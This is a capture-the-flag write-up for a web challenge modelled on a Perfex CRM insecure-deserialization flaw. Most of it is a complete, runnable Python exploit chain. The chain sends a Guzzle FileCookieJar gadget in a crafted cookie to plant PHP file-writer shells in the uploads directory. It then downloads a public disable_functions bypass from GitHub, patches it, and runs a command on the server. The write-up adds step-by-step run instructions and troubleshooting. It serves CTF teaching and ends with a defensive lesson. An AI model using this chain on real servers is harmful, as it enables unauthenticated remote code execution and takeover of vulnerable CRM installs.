---
title: "NexusCRM"
summary: "UMCS Preliminary umcs preliminary, web, forensics writeup covering NexusCRM with analysis, solution steps, and final recovery notes."
date: 2026-04-26
tags:
  - ctf
  - umcs-preliminary
  - web
  - forensics
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://umcybersec.site/assets/logo-BsYk-M08.png"
---
# Challenge Overview

**Challenge Name:** NexusCRM
**Category:** Web
**Points:** Not provided
**Flag Format:** `UMCS{...}`
**Target:** A live NexusCRM web instance, for example:

```text
http://94a26a8b-9c58-4f5d-96c3-e8d7bbbc07a7.chal.umcybersec.site:8001
```

The challenge was based on an unauthenticated Perfex CRM insecure deserialization vulnerability. The goal was to obtain the flag from the target server. The final confirmed flag was:

```text
UMCS{SOMEONE_IS_ON_@_RAMPAGGEEEEE}
```

The public write-up that inspired the challenge explains that vulnerable Perfex CRM versions pass an autologin cookie directly into `unserialize()`, allowing unauthenticated PHP object injection and remote code execution through a Guzzle `FileCookieJar` gadget chain. ([NULL CATHEDRAL](https://nullcathedral.com/posts/2026-03-16-perfex-crm-unauthenticated-rce-insecure-deserialization/ "Perfex CRM <=3.4.0 allows unauthenticated RCE via insecure deserialization — NULL CATHEDRAL"))

---

# Initial Analysis

The target behaved like a CodeIgniter/PHP CRM application. The important observed behavior was that a remember-me style cookie named `nx_remember` was processed by the application on common routes such as:

```text
/login
/
/dashboard
```

During testing, a crafted serialized object written into the `nx_remember` cookie successfully triggered PHP object deserialization. The exploit was able to write files under:

```text
/var/www/html/uploads/
```

and the written PHP files were web-accessible through:

```text
/uploads/<filename>.php
```

A diagnostic PHP runner confirmed the target environment:

```text
PHP_VERSION=8.1.34
SAPI=apache2handler
```

It also confirmed that the real flag was not directly readable through PHP:

```text
/flag.txt exists=yes
/flag.txt readable=no
/readflag exists=yes
/readflag exec=yes
```

The final successful run also showed that many dangerous PHP functions were disabled, including `system`, `exec`, `shell_exec`, `passthru`, `proc_open`, `popen`, `dl`, `mail`, `putenv`, `pack`, and `eval`.

This meant a normal PHP webshell would not be enough. The exploit needed two stages:

```text
1. Abuse deserialization to write PHP files.
2. Bypass PHP disable_functions to execute /readflag.
```

---

# Vulnerability / Weakness Identification

The core weakness was **PHP insecure deserialization** in the remember-me cookie flow.

The challenge mirrored the Perfex CRM bug described by Null Cathedral:

```php
$data = unserialize($cookie);
```

The original Perfex vulnerability passed the autologin cookie directly into `unserialize()` without validation. The write-up also explains that the cookie is processed on every route because the authentication model is loaded automatically. ([NULL CATHEDRAL](https://nullcathedral.com/posts/2026-03-16-perfex-crm-unauthenticated-rce-insecure-deserialization/ "Perfex CRM <=3.4.0 allows unauthenticated RCE via insecure deserialization — NULL CATHEDRAL"))

The object injection was useful because the application included Guzzle. Guzzle’s `FileCookieJar` class has a destructor that writes cookie data to disk:

```php
public function __destruct()
{
    $this->save($this->filename);
}
```

The write-up shows that `FileCookieJar` eventually reaches `file_put_contents($filename, ...)`, which gives attacker-controlled file write when the object’s private fields are controlled. ([NULL CATHEDRAL](https://nullcathedral.com/posts/2026-03-16-perfex-crm-unauthenticated-rce-insecure-deserialization/ "Perfex CRM <=3.4.0 allows unauthenticated RCE via insecure deserialization — NULL CATHEDRAL"))

There were three important serialization details:

1. PHP private properties use null bytes in their serialized names:


```text
\0ClassName\0property
```

2. CodeIgniter filtering may strip literal null bytes.

3. PHP’s uppercase serialized string format `S:` can encode bytes as printable hex escapes. For example:


```text
S:3:"\00A\00"
```

The Null Cathedral write-up specifically highlights that uppercase `S:` resolves `\xx` escapes during deserialization, allowing null bytes and backslashes to survive filtering. ([NULL CATHEDRAL](https://nullcathedral.com/posts/2026-03-16-perfex-crm-unauthenticated-rce-insecure-deserialization/ "Perfex CRM <=3.4.0 allows unauthenticated RCE via insecure deserialization — NULL CATHEDRAL"))

So the exploitation primitive became:

```text
nx_remember cookie
→ unserialize()
→ Guzzle FileCookieJar object
→ FileCookieJar::__destruct()
→ file_put_contents('/var/www/html/uploads/<file>.php', controlled content)
```

---

# Exploitation Strategy

The full exploit used a multi-stage approach.

## Stage 1 — Write a PHP manager

First, send a crafted `nx_remember` cookie containing a serialized Guzzle `FileCookieJar` object.

The file written is a small PHP manager:

```php
<?php
// accepts POST path + base64 data
// writes files into /var/www/html/uploads/
?>
```

This manager gives a stable arbitrary file-write endpoint inside `/uploads`.

## Stage 2 — Upload a chunk writer

Uploading a large payload directly through the manager caused HTTP timeouts. To avoid that, the exploit uploads a smaller `chunker.php` first.

The chunker supports:

```text
op=init    create/overwrite file
op=append  append next chunk
```

This allows reliable upload of the larger mm0r1 payload in 700-byte chunks.

## Stage 3 — Patch mm0r1 php-concat-bypass

The challenge disabled normal command execution. However, the mm0r1 `php-concat-bypass` exploit targets PHP 7.3–8.1 and bypasses `disable_functions` by abusing a PHP string concatenation memory corruption bug. The mm0r1 README describes it as a PHP 7.3–8.1 `disable_functions` bypass and notes that it was tested with Apache2 server APIs. ([GitHub](https://github.com/mm0r1/exploits/tree/master/php-concat-bypass "exploits/php-concat-bypass at master · mm0r1/exploits · GitHub"))

The target was PHP 8.1.34, so the bypass was suitable.

However, two modifications were needed:

1. The original PoC executes:


```php
new Pwn("uname -a");
```

This had to be replaced with:

```php
new Pwn("/readflag > /var/www/html/uploads/realflag_xxxxxx.txt 2>&1; /bin/cat /var/www/html/uploads/realflag_xxxxxx.txt 2>&1");
```

2. The target disabled `pack()`. The original mm0r1 exploit uses:


```php
pack("Q*", ...)
```

So the solver patches it with a manual little-endian 64-bit packing function:

```php
static function p64($v) {
    $o = '';
    for ($i = 0; $i < 8; $i++) {
        $o .= chr($v & 0xff);
        $v >>= 8;
    }
    return $o;
}
```

## Stage 4 — Trigger the patched payload

Finally, request the uploaded mm0r1 payload:

```text
/uploads/mm0r1_readflag_fixed_<tag>.php
```

The successful run showed that the exploit found important internal PHP symbols such as `standard module`, `basic_functions`, and `zif_system`, then executed `/readflag`.

---

# Proof of Concept

The core payload is a serialized Guzzle `FileCookieJar` object placed in the `nx_remember` cookie.

The important fields are:

```text
GuzzleHttp\Cookie\FileCookieJar::$filename
GuzzleHttp\Cookie\FileCookieJar::$storeSessionCookies
GuzzleHttp\Cookie\CookieJar::$cookies
GuzzleHttp\Cookie\SetCookie::$data
```

The `SetCookie` data is shaped so that when `FileCookieJar` saves the cookie jar as JSON, a PHP tag is written into the file. PHP ignores the surrounding JSON text and executes the PHP code inside `<?php ... ?>`.

The exploit flow is:

```bash
python3 solve_nexuscrm_full.py http://TARGET:8001
```

Expected successful output:

```text
MM0R1_FIXED_START
CMD=/readflag > /var/www/html/uploads/realflag_fixed_xxxxxx.txt 2>&1; /bin/cat /var/www/html/uploads/realflag_fixed_xxxxxx.txt 2>&1
standard module @ 0x...
zif_system @ 0x...
UMCS{SOMEONE_IS_ON_@_RAMPAGGEEEEE}
MM0R1_FIXED_END
```

The confirmed final run produced:

```text
UMCS{SOMEONE_IS_ON_@_RAMPAGGEEEEE}
```

---

# Full Python Solver

```python
#!/usr/bin/env python3
import base64
import random
import re
import string
import sys
import time
import urllib.parse

import requests


RAW_MM0R1_URL = "https://raw.githubusercontent.com/mm0r1/exploits/master/php-concat-bypass/exploit.php"

UPLOAD_DIR = "/var/www/html/uploads"
COOKIE_NAME = "nx_remember"


def rand_tag(length=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))


def php_s(value: str) -> str:
    """
    Normal PHP serialized string.
    """
    return f's:{len(value.encode())}:"{value}";'


def php_S_bytes(raw: bytes) -> str:
    """
    Uppercase S: serialized string.

    This is needed because PHP private properties contain null bytes:
        \\x00ClassName\\x00property

    CodeIgniter filtering can strip literal null bytes, but PHP unserialize()
    resolves printable \\00 and \\5C escapes in uppercase S: strings.
    """
    out = ""

    for b in raw:
        if b == 0:
            out += r"\00"
        elif b == 0x5C:
            out += r"\5C"
        elif 32 <= b <= 126:
            out += chr(b)
        else:
            out += "\\%02X" % b

    return f'S:{len(raw)}:"{out}";'


def php_S_allhex(raw: bytes) -> str:
    """
    Encode every byte as \\XX inside an uppercase S: string.
    This safely carries PHP tags through filtering.
    """
    escaped = "".join("\\%02X" % b for b in raw)
    return f'S:{len(raw)}:"{escaped}";'


def private_prop(class_name: str, prop_name: str) -> str:
    """
    PHP private property name:
        \\x00ClassName\\x00property
    """
    raw = b"\x00" + class_name.encode() + b"\x00" + prop_name.encode()
    return php_S_bytes(raw)


def build_filecookiejar_payload(filename: str, php_code: bytes) -> str:
    """
    Build the Guzzle FileCookieJar gadget.

    On destruction, FileCookieJar saves its cookies to $filename.
    The cookie's Value field contains PHP code.
    """
    fcj = "GuzzleHttp\\Cookie\\FileCookieJar"
    cj = "GuzzleHttp\\Cookie\\CookieJar"
    sc = "GuzzleHttp\\Cookie\\SetCookie"

    cookie_data = (
        "a:9:{"
        + php_s("Name") + php_s("x")
        + php_s("Value") + php_S_allhex(php_code)
        + php_s("Domain") + php_s("localhost")
        + php_s("Path") + php_s("/")
        + php_s("Max-Age") + "N;"
        + php_s("Expires") + "i:2000000000;"
        + php_s("Secure") + "b:0;"
        + php_s("Discard") + "b:0;"
        + php_s("HttpOnly") + "b:0;"
        + "}"
    )

    setcookie_obj = (
        f'O:{len(sc)}:"{sc}":1:{{'
        + private_prop(sc, "data")
        + cookie_data
        + "}"
    )

    filecookiejar_obj = (
        f'O:{len(fcj)}:"{fcj}":4:{{'
        + private_prop(fcj, "filename") + php_s(filename)
        + private_prop(fcj, "storeSessionCookies") + "b:1;"
        + private_prop(cj, "cookies") + f'a:1:{{i:0;{setcookie_obj}}}'
        + private_prop(cj, "strictMode") + "b:0;"
        + "}"
    )

    # The vulnerable app checks for key/user_id after unserialize().
    # Wrapping the gadget in an array avoids PHP 8 TypeError.
    payload = (
        "a:3:{"
        + php_s("key") + php_s("x")
        + php_s("user_id") + php_s("1")
        + php_s("jar") + filecookiejar_obj
        + "}"
    )

    return payload


def manager_php() -> bytes:
    """
    Small PHP file writer.

    It writes base64-decoded POST data into /var/www/html/uploads/<path>.
    """
    code = (
        "<?php header('Content-Type:text/plain');"
        "$s=chr(47);"
        "$b=$s.'var'.$s.'www'.$s.'html'.$s.'uploads'.$s;"
        "function cleanp($p){"
        "$p=str_replace(chr(0),'',$p);"
        "if(strpos($p,'..')!==false)die('bad path');"
        "if(substr($p,0,1)==chr(47))die('abs path');"
        "return $p;"
        "}"
        "if(isset($_POST['write'])&&isset($_POST['path'])&&isset($_POST['b64'])){"
        "$p=cleanp($_POST['path']);"
        "$full=$GLOBALS['b'].$p;"
        "@mkdir(dirname($full),0777,true);"
        "$d=base64_decode($_POST['b64']);"
        "$r=file_put_contents($full,$d);"
        "$mode=isset($_POST['mode'])?octdec($_POST['mode']):0644;"
        "@chmod($full,$mode);"
        "echo 'WRITE='.$full.' ret='.(($r===false)?'false':$r).' exists='.(file_exists($full)?'yes':'no').' mode='.(file_exists($full)?decoct(fileperms($full)&0777):'-').chr(10);"
        "exit;"
        "}"
        "echo 'manager alive'.chr(10);"
        "echo 'PHP_VERSION='.PHP_VERSION.chr(10);"
        "echo 'disable_functions='.ini_get('disable_functions').chr(10);"
        "?>"
    )

    return code.encode()


CHUNKER_PHP = rb'''<?php
header('Content-Type:text/plain');
error_reporting(E_ALL);
ini_set('display_errors','1');

$base='/var/www/html/uploads/';

function cleanp($p){
    $p=str_replace(chr(0),'',$p);
    if(strpos($p,'..')!==false) die('bad path');
    if(substr($p,0,1)==chr(47)) die('abs path');
    return $p;
}

if(!isset($_POST['path'])){
    echo "chunker alive\n";
    exit;
}

$p=cleanp($_POST['path']);
$full=$base.$p;
@mkdir(dirname($full),0777,true);

$op=$_POST['op'] ?? 'append';
$d=base64_decode($_POST['b64'] ?? '');

if($op==='init'){
    $r=file_put_contents($full,$d);
}else{
    $r=file_put_contents($full,$d,FILE_APPEND);
}

@chmod($full,0644);

echo "op=$op path=$full wrote=".(($r===false)?'false':$r)." size=".(file_exists($full)?filesize($full):'none')."\n";
?>'''


def trigger_deserialization(base_url: str, target_path: str, code: bytes):
    """
    Send the serialized object in the nx_remember cookie.
    """
    payload = build_filecookiejar_payload(target_path, code)
    cookie = urllib.parse.quote(payload, safe="")

    headers = {
        "Cookie": f"{COOKIE_NAME}={cookie}",
        "User-Agent": "nexuscrm-writeup-solver",
    }

    for route in ["/login", "/", "/dashboard"]:
        url = base_url + route

        try:
            r = requests.get(url, headers=headers, timeout=25, allow_redirects=False)
            print(f"[*] trigger {route} HTTP {r.status_code}")
        except Exception as e:
            print(f"[!] trigger {route} failed: {e}")


def fetch(label: str, url: str, timeout=80):
    print(f"\n[*] Fetching {label}: {url}")

    try:
        r = requests.get(url, timeout=timeout)
        print(f"[*] HTTP {r.status_code}")
        print(r.text[:30000])

        flags = re.findall(r"UMCS\{[^}\r\n<\x00]+}", r.text)
        if flags:
            print("[+] FLAG FOUND:")
            for flag in dict.fromkeys(flags):
                print(flag)
            return True, r.text

        return False, r.text

    except Exception as e:
        print(f"[!] fetch failed: {e}")
        return False, ""


def manager_write(manager_url: str, rel_path: str, data: bytes, mode="0644"):
    """
    Use the uploaded manager to write a file into /uploads.
    """
    r = requests.post(
        manager_url,
        data={
            "write": "1",
            "path": rel_path,
            "b64": base64.b64encode(data).decode(),
            "mode": mode,
        },
        timeout=80,
    )

    print(r.text[:1500])
    return r


def chunk_upload(chunker_url: str, rel_path: str, data: bytes, chunk_size=700):
    """
    Upload a large payload through chunker.php.
    """
    print(f"[*] Chunk uploading {len(data)} bytes to {rel_path}")

    offset = 0
    idx = 0

    while offset < len(data):
        chunk = data[offset:offset + chunk_size]
        op = "init" if idx == 0 else "append"

        r = requests.post(
            chunker_url,
            data={
                "op": op,
                "path": rel_path,
                "b64": base64.b64encode(chunk).decode(),
            },
            timeout=40,
        )

        print(f"chunk {idx:03d} off={offset} len={len(chunk)} -> {r.text.strip()[:200]}")

        offset += len(chunk)
        idx += 1
        time.sleep(0.08)


def download_mm0r1():
    """
    Download the public php-concat-bypass PoC.
    """
    print("[*] Downloading mm0r1 php-concat-bypass")
    r = requests.get(RAW_MM0R1_URL, timeout=60)
    r.raise_for_status()

    code = r.text.replace("\r\n", "\n")

    if 'new Pwn("uname -a");' not in code:
        raise RuntimeError("Unexpected mm0r1 source: original uname call not found")

    return code


def patch_mm0r1(raw_code: str, flag_path: str) -> bytes:
    """
    Patch mm0r1 exploit for the challenge.

    Changes:
      1. Remove closing PHP tag.
      2. Replace new Pwn("uname -a") with /readflag command.
      3. Replace disabled pack("Q*", ...) with a custom p64() function.
      4. Enable logging so we can see zif_system resolution.
    """
    cmd = f"/readflag > {flag_path} 2>&1; /bin/cat {flag_path} 2>&1"
    cmd_b64 = base64.b64encode(cmd.encode()).decode()

    code = raw_code

    # Avoid appending PHP code after a closing tag.
    code = re.sub(r"\?>\s*$", "", code)

    # Replace original test command.
    replacement = (
        f"$cmd = base64_decode('{cmd_b64}');\n"
        f"echo \"MM0R1_FIXED_START\\n\";\n"
        f"echo \"CMD=$cmd\\n\";\n"
        f"new Pwn($cmd);\n"
        f"echo \"MM0R1_FIXED_END\\n\";\n"
    )

    code, replaced = re.subn(
        r'new\s+Pwn\s*\(\s*"uname -a"\s*\)\s*;',
        replacement,
        code,
        count=1,
    )

    if replaced != 1:
        raise RuntimeError("Failed to replace original new Pwn(\"uname -a\") call")

    # Add manual little-endian 64-bit pack replacement.
    p64_method = (
        "static function p64($v) {\n"
        "    $o = '';\n"
        "    for($i = 0; $i < 8; $i++) {\n"
        "        $o .= chr($v & 0xff);\n"
        "        $v >>= 8;\n"
        "    }\n"
        "    return $o;\n"
        "}\n"
    )

    if "static function p64(" not in code:
        code = re.sub(
            r"class\s+Pwn\s*\{",
            "class Pwn {\n" + p64_method,
            code,
            count=1,
        )

    code = code.replace(
        'pack("Q*", 0xdeadbeef, 0xcafebabe, $addr)',
        'self::p64(0xdeadbeef) . self::p64(0xcafebabe) . self::p64($addr)'
    )

    code = code.replace(
        "pack('Q*', 0xdeadbeef, 0xcafebabe, $addr)",
        "self::p64(0xdeadbeef) . self::p64(0xcafebabe) . self::p64($addr)"
    )

    code = code.replace("const LOGGING = false;", "const LOGGING = true;")

    if "pack(" in code:
        print("[!] Warning: payload still contains pack(")

    if "uname -a" in code:
        print("[!] Warning: payload still contains uname -a")

    if "?>" in code:
        print("[!] Warning: payload still contains closing PHP tag")

    return code.encode()


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://target:8001")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")
    upload_url = base_url + "/uploads"

    tag = rand_tag()

    manager_name = f"perfex_mgr_{tag}.php"
    chunker_name = f"chunker_fixed_{tag}.php"
    pwn_name = f"mm0r1_readflag_fixed_{tag}.php"
    flag_name = f"realflag_fixed_{tag}.txt"

    manager_path = f"{UPLOAD_DIR}/{manager_name}"
    manager_url = f"{upload_url}/{manager_name}"

    chunker_url = f"{upload_url}/{chunker_name}"
    pwn_url = f"{upload_url}/{pwn_name}"
    flag_url = f"{upload_url}/{flag_name}"

    flag_path = f"{UPLOAD_DIR}/{flag_name}"

    print("[*] Stage 1: writing PHP manager via nx_remember deserialization")
    print(f"[*] Manager path: {manager_path}")

    trigger_deserialization(base_url, manager_path, manager_php())

    time.sleep(1)

    ok, text = fetch("manager", manager_url, timeout=40)
    if "manager alive" not in text:
        print("[-] Manager was not created or not executable.")
        print("[*] Try rerunning or verify the cookie name/path.")
        return

    print("\n[*] Stage 2: uploading chunker")
    manager_write(manager_url, chunker_name, CHUNKER_PHP, "0644")

    ok, text = fetch("chunker", chunker_url, timeout=40)
    if "chunker alive" not in text:
        print("[-] Chunker failed.")
        return

    print("\n[*] Stage 3: downloading and patching mm0r1 bypass")
    raw_mm0r1 = download_mm0r1()
    patched_payload = patch_mm0r1(raw_mm0r1, flag_path)

    local_payload = f"mm0r1_readflag_fixed_{tag}.php"
    with open(local_payload, "wb") as f:
        f.write(patched_payload)

    print(f"[+] Saved local payload: {local_payload}")
    print(f"[+] Payload size: {len(patched_payload)} bytes")
    print(f"[+] PWN_URL: {pwn_url}")
    print(f"[+] FLAG_URL: {flag_url}")

    print("\n[*] Stage 4: uploading patched bypass in chunks")
    chunk_upload(chunker_url, pwn_name, patched_payload, chunk_size=700)

    print("\n[*] Stage 5: triggering patched mm0r1 payload")
    for attempt in range(1, 13):
        print(f"\n=== attempt {attempt}/12 ===")

        solved, output = fetch("fixed mm0r1 pwn", pwn_url, timeout=120)
        if solved:
            return

        if "UMCS" in output:
            print("[+] UMCS-like output appeared above.")
            return

        time.sleep(0.8)

        solved, output = fetch("flag artifact", flag_url, timeout=40)
        if solved:
            return

        if "UMCS" in output:
            print("[+] UMCS-like output appeared above.")
            return

    print("\n[-] Flag was not recovered.")
    print("[*] Troubleshooting:")
    print("    - If output says 'uaf failed', rerun the script.")
    print("    - If HTTP 500 or timeout occurs, restart the challenge instance and rerun.")
    print("    - If it prints uname -a, the old unpatched payload is being triggered.")
    print("    - If it complains about pack(), the pack replacement failed.")
    print("[*] Manual checks:")
    print(f"    curl -s {pwn_url}")
    print(f"    curl -s {flag_url}")


if __name__ == "__main__":
    main()
```

---

# Walkthrough

## 1. Install dependencies

The solver needs Python 3 and `requests`.

```bash
python3 -m pip install requests
```

## 2. Save the solver

```bash
nano solve_nexuscrm_full.py
```

Paste the full Python solver above.

## 3. Run the exploit

```bash
python3 solve_nexuscrm_full.py "http://TARGET:8001"
```

Example:

```bash
python3 solve_nexuscrm_full.py "http://94a26a8b-9c58-4f5d-96c3-e8d7bbbc07a7.chal.umcybersec.site:8001"
```

## 4. Expected stages

The solver should first create the PHP manager:

```text
[*] Stage 1: writing PHP manager via nx_remember deserialization
[*] trigger /login HTTP 200
[*] Fetching manager: ...
manager alive
```

Then upload the chunker:

```text
[*] Stage 2: uploading chunker
chunker alive
```

Then download and patch mm0r1:

```text
[*] Stage 3: downloading and patching mm0r1 bypass
[+] Saved local payload: mm0r1_readflag_fixed_xxxxxx.php
```

Then upload the payload in chunks:

```text
chunk 000 off=0 len=700 -> op=init ...
chunk 001 off=700 len=700 -> op=append ...
...
```

Finally, it triggers the mm0r1 payload:

```text
MM0R1_FIXED_START
CMD=/readflag > /var/www/html/uploads/realflag_fixed_xxxxxx.txt 2>&1; /bin/cat ...
standard module @ 0x...
zif_system @ 0x...
UMCS{...}
MM0R1_FIXED_END
```

## Troubleshooting

If the first request to the payload returns HTTP 404 from `frp`, retry. In the successful run, the first request returned a transient 404, and the second request succeeded.

If the mm0r1 payload prints `uaf failed`, rerun the script. The exploit depends on heap layout.

If the server crashes or returns HTTP 500, restart the challenge instance and rerun.

If the output still shows `uname -a`, then an old unpatched mm0r1 file is being triggered. The patched payload should print:

```text
MM0R1_FIXED_START
CMD=/readflag ...
```

---

# Flag

The final successful payload output was:

```text
UMCS{SOMEONE_IS_ON_@_RAMPAGGEEEEE}
```

The confirmed run showed `zif_system` being resolved and then `/readflag` returning the flag.

---

# Conclusion

The challenge combined two exploitation ideas.

The first was a web application vulnerability: unauthenticated PHP object injection through a remember-me cookie. By abusing Guzzle’s `FileCookieJar`, the attacker could write arbitrary PHP files into the web-accessible upload directory. This matched the Perfex CRM insecure deserialization chain described by Null Cathedral. ([NULL CATHEDRAL](https://nullcathedral.com/posts/2026-03-16-perfex-crm-unauthenticated-rce-insecure-deserialization/ "Perfex CRM <=3.4.0 allows unauthenticated RCE via insecure deserialization — NULL CATHEDRAL"))

The second was a PHP runtime bypass. A normal webshell was ineffective because `disable_functions` blocked all common command execution functions. The solution was to patch and use mm0r1’s `php-concat-bypass`, which targets PHP 7.3–8.1 and bypasses `disable_functions` through a PHP memory corruption issue. ([GitHub](https://github.com/mm0r1/exploits/tree/master/php-concat-bypass "exploits/php-concat-bypass at master · mm0r1/exploits · GitHub"))

The key lesson is that `disable_functions` is not a reliable security boundary. Once attacker-controlled PHP execution is obtained, memory-corruption-based bypasses can still recover access to internal functions such as `system()` and execute privileged helpers like `/readflag`.
